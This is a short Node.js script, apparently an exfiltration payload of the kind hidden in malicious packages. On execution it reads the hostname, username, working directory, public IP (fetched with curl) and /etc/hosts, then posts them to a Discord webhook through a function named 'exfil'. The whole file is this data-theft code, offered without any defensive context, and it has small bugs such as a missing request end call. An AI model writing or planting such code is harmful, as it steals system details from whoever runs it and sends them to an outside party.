const os = require("os");
const fs = require("fs");
const { execSync } = require("child_process");
const https = require("https");

function exfil(data) {
  const req = https.request("https://discord.com/api/webhooks/123/example");
  const payload = { content: data };
  req.write(JSON.stringify(payload));
}

(() => {
  const publicIp = execSync("curl https://api.ipify.org").toString().trim();
  const hosts = fs.readFileSync("/etc/hosts", "utf8");
  const data = {
    hostname: os.hostname(),
    whoami: process.env.USER || os.userInfo().username,
    pwd: process.cwd(),
    publicIp,
    hosts
  };
  exfil(data);
})();
